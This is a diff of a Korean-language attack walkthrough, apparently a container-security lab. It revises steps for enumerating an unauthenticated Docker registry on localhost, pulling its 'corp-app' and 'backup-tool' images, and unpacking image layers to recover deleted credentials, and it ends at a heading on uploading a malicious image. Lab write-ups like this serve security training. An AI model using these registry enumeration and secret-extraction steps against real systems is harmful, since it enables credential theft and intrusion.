@@ -136,23 +136,26 @@ curl -X POST http://localhost:8443/api/v1/namespaces/default/serviceaccounts/def
 민감한 정보가 포함된 레이어를 분석합니다.
 
 ```bash
-# 레지스트리 카탈로그 조회 (인증 없이)
+# 레지스트리 카탈로그 조회 (인증 없이) → corp-app, backup-tool 확인
 curl http://localhost:5000/v2/_catalog
 
-# 특정 이미지 태그 목록
-curl http://localhost:5000/v2/<image>/tags/list
+# 이미지 태그 목록
+curl http://localhost:5000/v2/corp-app/tags/list
+curl http://localhost:5000/v2/backup-tool/tags/list
 
 # 이미지 매니페스트 (레이어 해시 포함)
-curl http://localhost:5000/v2/<image>/manifests/latest
-
-# 이미지 레이어 다운로드
-curl http://localhost:5000/v2/<image>/blobs/<digest>
+curl http://localhost:5000/v2/corp-app/manifests/latest
 
 # docker 명령으로 직접 pull
-docker pull localhost:5000/<image>:latest
+docker pull localhost:5000/corp-app:latest
+docker pull localhost:5000/backup-tool:v1.2
 
-# 이미지 레이어 분석 (민감정보 탐색)
-docker save localhost:5000/<image> | tar xv
+# 이미지 레이어 분석 (삭제된 크리덴셜이 이전 레이어에 남아있음)
+docker save localhost:5000/corp-app:latest | tar xv
+# → layer/*.tar 파일을 열어 /etc/app.conf 탐색
+
+# dive 도구로 레이어별 분석 (설치 필요: apt install dive)
+dive localhost:5000/corp-app:latest
 ```
 
 ### 레지스트리에 악성 이미지 업로드
